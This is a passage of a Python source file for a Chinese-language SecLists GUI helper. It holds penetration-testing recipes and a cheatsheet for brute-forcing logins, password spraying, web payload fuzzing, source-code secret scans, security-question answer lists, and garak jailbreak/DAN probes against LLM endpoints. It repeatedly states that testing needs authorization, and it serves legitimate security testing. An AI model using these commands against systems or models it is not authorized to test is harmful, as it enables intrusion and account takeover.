             "cmd": "while IFS= read -r p; do curl -sk {url}/v1/chat/completions -H 'Content-Type: application/json' -H \"Authorization: Bearer $TOKEN\" -d \"$(python3 -c 'import json,sys;print(json.dumps({\\\"messages\\\":[{\\\"role\\\":\\\"user\\\",\\\"content\\\":sys.argv[1]}]}))' \"$p\")\" >> llm-results.jsonl; done < prompts.txt",
             "note": "用 json.dumps 做转义，避免提示词里的引号破坏 JSON"},
            {"tool": "garak（自动化）", "shell": "bash",
             "cmd": "garak --model_type openai --model_name gpt-4o-mini --probes jailbreak,leakreplay,dan --report_prefix garak-run",
             "note": "LLM 漏洞扫描器，把各类探针跑一遍出报告"},
            {"tool": "promptfoo（回归测试）", "shell": "bash",
             "cmd": "promptfoo eval -c promptfooconfig.yaml --output results.json",
             "note": "把提示词清单做成回归用例，改模型后复测"},
            {"tool": "CSV 提列", "shell": "bash",
             "cmd": "python3 -c \"import csv,sys;[print(r[0]) for r in csv.reader(open('{jailbreak}'))]\" > prompts.txt",
             "note": "把 CSV 里的提示词列提取成一行一条的清单"},
        ],
        "tips": [
            "只测试你有权测试的模型/服务；对外部服务做越狱测试通常违反其条款。",
            "记录「提示词 → 响应」配对结果，便于复现与修复验证。",
            "除越狱外也要测：输出内容的 HTML/Markdown 注入、工具调用（function calling）滥用、RAG 数据源投毒。",
            "中文场景记得补充中文提示词，很多清单是英文的。",
        ],
    },
    {
        "id": "pattern-audit",
        "group": "special",
        "title": "源码审计与敏感信息扫描",
        "level": "进阶",
        "summary": "拿到源码（或 .git 泄露的源码）后，用关键字/正则清单快速定位危险函数、"
                   "硬编码密钥、调试开关、备份文件等。",
        "why": "Pattern-Matching 与 Discovery/Variables 提供「该搜什么」的清单，"
               "配合 grep / semgrep / trufflehog 一次性过一遍。",
        "lists": [
            {"key": "php", "path": "Pattern-Matching/Source-Code-(PHP)/php-auditing.txt",
             "note": "PHP 审计正则/关键字（危险函数、超全局变量）"},
            {"key": "secret", "path": "Discovery/Variables/secret-keywords.txt",
             "note": "密钥类关键字（secret、token、apikey…）"},
            {"key": "envs", "path": "Discovery/Variables/awesome-environment-variable-names.txt",
             "note": "环境变量名清单，找配置泄露"},
            {"key": "headers", "path": "Miscellaneous/Web/http-request-headers/http-request-headers-fields-large.txt",
             "note": "HTTP 头字段全集，审代理/网关配置时用"},
        ],
        "commands": [
            {"tool": "grep 按清单搜", "shell": "bash",
             "cmd": "grep -rInE -f {php} ./src | head -200",
             "note": "把审计清单当模式文件；-I 跳过二进制"},
            {"tool": "semgrep", "shell": "bash",
             "cmd": "semgrep --config auto --severity ERROR,WARNING ./src -o semgrep.json",
             "note": "语义级扫描，误报比 grep 低"},
            {"tool": "trufflehog（密钥）", "shell": "bash",
             "cmd": "trufflehog filesystem ./src --no-update --only-verified",
             "note": "专门找可用的云凭证/token 并验证有效性"},
            {"tool": "gitleaks", "shell": "bash",
             "cmd": "gitleaks detect --source ./src -v -r gitleaks-report.json",
             "note": "从 git 历史里翻密钥，比只看工作区更彻底"},
            {"tool": "危险函数定位", "shell": "bash",
             "cmd": "grep -rInE 'eval|assert|system|exec|preg_replace.*/e|unserialize|include\\(' ./src --include='*.php' | head -100",
             "note": "PHP 常见 RCE/反序列化入口"},
        ],
        "tips": [
            "审计顺序：入口（路由/控制器）→ 危险函数 → 参数是否可控 → 是否有过滤。",
            "别只看新增代码：git log -p 里删除的密钥常常还留在历史里。",
            "grep 清单可直接用本界面「工具箱」的「正则包含过滤」来筛选字典/结果。",
        ],
    },
    {
        "id": "misc-lists",
        "group": "special",
        "title": "杂项清单的妙用",
        "level": "入门",
        "summary": "SecLists 里还有很多「看起来无关」但实战好用的清单："
                   "HTTP 头字段、会话 ID、密码提示问题答案、HTML 事件/标签、UA、多语言单词表。",
        "why": "遇到特殊场景（改密码提示问题、测 UA 处理、测头部注入）时，"
               "临时写字典不如直接用现成的。",
        "lists": [
            {"key": "uafuzz", "path": "Fuzzing/User-Agents/UserAgents.fuzz.txt",
             "note": "真实 UA 清单，测 UA 解析/日志注入/风控绕过"},
            {"key": "ua_big", "path": "Fuzzing/User-Agents/user-agents-whatismybrowserdotcom-large.txt",
             "note": "更大规模的现代 UA 清单"},
            {"key": "secrets", "path": "Miscellaneous/Security-Question-Answers/common-surnames.txt",
             "note": "密码提示问题答案（姓氏），社工/自助找回场景"},
            {"key": "cities", "path": "Miscellaneous/Security-Question-Answers/cities.txt",
             "note": "城市名清单（提示问题答案）"},
            {"key": "sessionid", "path": "Miscellaneous/Web/session-id.txt",
             "note": "会话 ID 样本，分析熵/规律"},
            {"key": "htmlevents", "path": "Miscellaneous/Web/html-events.txt",
             "note": "HTML 事件属性全集，做 XSS 上下文枚举"},
            {"key": "htmltags", "path": "Miscellaneous/Web/html-tags.txt",
             "note": "HTML 标签全集"},
            {"key": "hdrfields", "path": "Miscellaneous/Web/http-request-headers/http-request-headers-fields-large.txt",
             "note": "请求头字段全集"},
        ],
        "commands": [
            {"tool": "UA 测试", "shell": "bash",
             "cmd": "ffuf -u {url}/ -H 'User-Agent: FUZZ' -w {uafuzz} -mc all -fs <基线长度> -t 20",
             "note": "观察哪些 UA 触发不同响应（封禁名单、特殊接口）"},
            {"tool": "请求头 fuzz", "shell": "bash",
             "cmd": "ffuf -u {url}/ -H 'FUZZ: 127.0.0.1' -w {hdrfields} -mc all -fs <基线长度> -t 20",
             "note": "探测哪些头会影响行为（调试头、内部头）"},
            {"tool": "提示问题枚举", "shell": "bash",
             "cmd": "cat {cities} {secrets} | sort -u > security-answers.txt",
             "note": "合并成一份「找回密码答案」字典，配合喷洒逻辑使用"},
        ],
        "tips": [
            "很多清单的价值不在「直接爆破」，而在「提供枚举维度」。",
            "多语言词表（Miscellaneous/Words）可用来造本地化字典，中文场景注意补充拼音。",
            "Miscellaneous/Web 里的清单在测 WAF/网关规则时特别好用。",
        ],
    },
]


# --------------------------------------------------------------------------
# 速查手册（Markdown 风格，界面里做简单渲染）
# --------------------------------------------------------------------------
CHEATSHEET = r"""
# SecLists 速查手册

## 0. 先看这里：合规与边界
- 这些字典只用于**你拥有**或**已获书面授权**的目标；未授权扫描在多数司法辖区违法。
- 高风险动作（口令爆破、上传 Zip 炸弹、部署 WebShell、sqlmap --os-shell）请先确认授权范围与回滚方案。
- 生产环境做在线爆破前，务必确认账户锁定策略，避免锁死管理员账号。

## 1. 这个仓库是什么
SecLists 是一批**纯文本字典文件**（一行一条），不是软件。渗透测试各环节把对应字典喂给工具即可。
本地仓库路径：`<仓库根>`（本界面右上角会显示实际路径）。

| 目录 | 用途 | 入门首选文件 |
|---|---|---|
| Discovery | 目录/文件/子域名/变量枚举 | `Discovery/Web-Content/raft-medium-directories.txt` |
| Passwords | 口令、默认凭据、泄露库 | `Passwords/Common-Credentials/10k-most-common.txt` |
| Fuzzing | XSS/SQLi/LFI 等载荷 | `Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt` |
| Usernames | 用户名、姓名、默认账户 | `Usernames/top-usernames-shortlist.txt` |
| Payloads | Zip 炸弹、畸形文件名 | `Payloads/Zip-Bombs/zbsm.zip` |
| Web-Shells | WebShell 样本 | `Web-Shells/PHP/Dysco.php` |
| Pattern-Matching | 审计正则/关键字 | `Pattern-Matching/Source-Code-(PHP)/php-auditing.txt` |
| Ai | LLM 测试提示词 | `Ai/LLM_Testing/README.md` |
| Miscellaneous | 词表、HTTP 头、提示问题答案 | `Miscellaneous/Web/session-id.txt` |

## 2. 工具 ↔ 字典 对照表

```
目录/文件发现   ffuf / feroxbuster / gobuster / dirsearch  → Discovery/Web-Content/raft-*directories.txt
敏感文件/备份   ffuf / gobuster                            → quickhits.txt, Common-DB-Backups.txt
参数名枚举      ffuf / arjun / x8                          → Discovery/Web-Content/burp-parameter-names.txt
API 端点        ffuf                                       → Discovery/Web-Content/api/api-endpoints.txt
子域名          gobuster dns / ffuf -H Host / dnsx / amass  → Discovery/DNS/subdomains-top1million-*.txt
虚拟主机        ffuf -H "Host: FUZZ.域名"                   → Discovery/DNS/namelist.txt
用户名          kerbrute / nxc / nmap smtp-enum-users       → Usernames/top-usernames-shortlist.txt
口令喷洒        nxc --no-bruteforce / hydra                 → Passwords/Common-Credentials/500-worst-passwords.txt
在线爆破        hydra (ssh/rdp/http-post-form)              → Passwords/Common-Credentials/10k-most-common.txt
离线破解        hashcat / john                              → Passwords/Leaked-Databases/rockyou.txt
默认凭据        hydra -C                                    → Passwords/Default-Credentials/default-passwords.txt
WiFi            aircrack-ng / hashcat -m 22000              → Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
XSS             ffuf -mr / dalfox / xsstrike                → Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt
SQLi            sqlmap / ffuf -mr                          → Fuzzing/Databases/SQLi/quick-SQLi.txt
LFI             ffuf -mr 'root:.*:0:0:'                    → Fuzzing/LFI/LFI-Jhaddix.txt
命令注入        commix / ffuf                              → Fuzzing/command-injection-commix.txt
SSTI            ffuf -mr '49'                              → Fuzzing/template-engines-expression.txt
XXE             curl --data-binary @payload.xml            → Fuzzing/XXE-Fuzzing.txt
上传测试        curl -F "file=@样本"                        → Payloads/Zip-Bombs, Payloads/File-Names
源码审计        grep -f / semgrep / trufflehog / gitleaks   → Pattern-Matching, Discovery/Variables
LLM 应用        garak / promptfoo / curl 循环                → Ai/LLM_Testing/*
```

## 3. 三条使用习惯
1. **先小后大**：永远先用小字典摸底（拿基线响应、确认过滤规则），再上大字典。
2. **先被动后主动**：能通过证书透明度、公开数据源拿到的信息，不要用爆破去撞。
3. **先记录再动手**：把使用的字典名、命令、结果存下来，报告和复现都靠它。

## 4. 常见坑
- `rockyou.txt` 在本仓库里是 **`rockyou.txt.tar.gz`**，需要先 `tar -xzf` 解压（约 133 MB）。
- `DirBuster-2007_directory-list-2.3-*.txt` 前几行是 `#` 注释，部分工具会当成真实路径，用「工具箱 → 去掉 # 注释行」清理。
- Windows 上编辑过的字典可能混入 CRLF 与 BOM，用「工具箱 → 去掉首尾空白」+ 保存为 UTF-8 处理。
- 大字典（>500 万行）用 ffuf 请加 `-t` 控制并发；hydra 在线爆破并发 ≤ 4（SSH）/ 1（RDP）。
- 目录 fuzz 结果里大量 200 可能是「软 404」，一定要用 `-fs`/`-fc` 过滤基线长度。
- WSL/Kali 与 Windows 双环境时，注意路径风格切换（本界面右上角「路径风格」）。

## 5. 自建字典的正确姿势
1. 用 `cewl` 爬目标站点拿专属词汇。
2. 与 SecLists 的通用字典合并：`cat custom.txt general.txt | tr 'A-Z' 'a-z' | sort -u > final.txt`。
3. 按长度/字符集过滤，去掉明显无效条目（本界面「工具箱」标签页可图形化完成）。
4. 针对口令加变形规则：大小写、年份后缀、`!@#` 后缀、leet 替换（参考 `Passwords/Permutations`）。

## 6. 关于本界面
- 纯本地 Tkinter 窗口，**不监听任何端口、不联网、不修改 SecLists 文件**。
- 「工具箱」写出的新字典默认放在 `seclists-gui/data/output/` 下。
- 行数统计缓存在 `seclists-gui/data/linecounts.json`，删除即可重建。
- 左侧双击文件 = 预览；右键 = 复制各种格式的路径。
"""


# --------------------------------------------------------------------------
# 目标与路径处理
# --------------------------------------------------------------------------
def derive_targets(raw: str) -> dict:
    """把用户输入解析成各种占位符取值。"""
    t = (raw or "").strip()
    out = {"target": t, "host": "", "hostname": "", "domain": "", "port": "", "url": "", "scheme": "https"}
    if not t:
        return out
    scheme = ""
    rest = t
    m = re.match(r"^([A-Za-z][A-Za-z0-9+.\-]*)://(.*)$", t)
    if m:
        scheme = m.group(1).lower()
        rest = m.group(2)
    rest = rest.split("/")[0].split("?")[0].split("#")[0]
    host = rest.rstrip("/")
    hostname = host.split(":")[0]
    port = host.split(":", 1)[1] if ":" in host else ""
    out.update({
        "host": host,
        "hostname": hostname,
        "domain": hostname,
        "port": port,
        "scheme": scheme or "https",
        "url": f"{scheme or 'https'}://{host}",
    })
    return out


def render_path(rel: str, style: str, root: str) -> str:
    """把相对路径渲染成指定风格。"""
    rel_posix = (rel or "").replace("\\", "/")
    if style == "kali":
        return "/usr/share/seclists/" + rel_posix.lstrip("/")
    if style == "rel":
        return rel_posix
    base = (root or "").replace("/", "\\").rstrip("\\")
    return base + "\\" + rel_posix.replace("/", "\\")


_NEEDS_QUOTE = re.compile(r"[\s()\[\]{}&;|<>$`!+^=%]|[\u4e00-\u9fff]")


def quote_path(path: str) -> str:
    if not path:
        return path
    if _NEEDS_QUOTE.search(path):
        return '"' + path.replace('"', '\\"') + '"'
    return path


_PLACEHOLDER = re.compile(r"\{([a-z][a-z0-9_]*)\}")


def render_command(template: str, lists: dict, targets: dict, style: str, root: str) -> str:
    """把命令模板里的 {占位符} 替换掉；未知占位符原样保留。"""

    def sub(match: re.Match) -> str:
        key = match.group(1)
        if key in lists:
            return quote_path(render_path(lists[key], style, root))
        if key in targets:
            return targets[key] or f"<{key}>"
        return match.group(0)

    return _PLACEHOLDER.sub(sub, template)
